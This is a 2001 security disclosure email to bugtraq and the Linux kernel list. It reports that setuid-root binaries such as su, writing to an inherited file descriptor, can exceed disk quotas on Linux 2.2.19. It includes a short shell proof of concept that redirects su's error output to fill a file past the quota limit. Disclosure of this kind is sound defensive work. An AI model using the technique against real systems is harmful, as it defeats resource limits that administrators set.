Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S278437AbRJVInQ>; Mon, 22 Oct 2001 04:43:16 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S278428AbRJVInH>; Mon, 22 Oct 2001 04:43:07 -0400
Received: from lama.supermedia.pl ([212.75.96.18]:61446 "EHLO
	lama.supermedia.pl") by vger.kernel.org with ESMTP
	id <S276814AbRJVImy>; Mon, 22 Oct 2001 04:42:54 -0400
Date: Mon, 22 Oct 2001 10:43:13 +0200 (CEST)
From: =?ISO-8859-2?Q?Wojciech_Purczy=F1ski?= <wp@supermedia.pl>
To: <bugtraq@securityfocus.com>, <linux-kernel@vger.kernel.org>
Subject: Overriding qouta limits in Linux kernel
Message-ID: <Pine.LNX.4.33.0110220947590.29104-100000@lama.supermedia.pl>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=ISO-8859-2
Content-Transfer-Encoding: 8BIT
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org


Almost any suid binary may be used to create large files overriding quota
limits.

When setuid-root binary inherits file descriptors from user process it may
write to it without respecting the quota restrictions. This is because
suid process has CAP_SYS_RESOURCE effective capability enabled during
writing to the file. Quota does not know anything about who opened file
descriptor and checks current process privileges only. This is bug in
kernel and not in those setuid-root binaries.

Tested on Linux kernel 2.2.19.

Example:

cliph$quota -u wp
Disk quotas for user wp (uid 500):
     Filesystem  blocks   quota   limit   files   quota   limit
      /dev/hda6       4      10      10       1      10      10

cliph$perl -e 'print "a"x16384' >>myfile
/vol1: write failed, user disk limit reached.

cliph$ls -l myfile
-rw-rw-r--    1 wp       wp           4096 Oct 22 10:33 myfile

cliph$su $(perl -e 'print "a"x16384') 2>>myfile
cliph$ # ^^^ this is it: su writes error message to fd 2 without limits

cliph$ls -l myfile
-rw-rw-r--    1 wp       wp          20505 Oct 22 10:34 myfile

cliph$quota -u wp
Disk quotas for user wp (uid 500):
     Filesystem  blocks   quota   limit   files   quota   limit
      /dev/hda6      28*     10      10       2      10      10

(I removed `grace' fields from quota output)

PS: Please include my address in CC as I may be not subscribed to the
list(s).

_________________________________________________________________
 Wojciech Purczyñski | Security Officer | http://cliph.linux.pl/
-----------------------------------------------------------------
 Murphy's law says that there is always one more bug...
          ...but he forgot to mention whether it is exploitable.

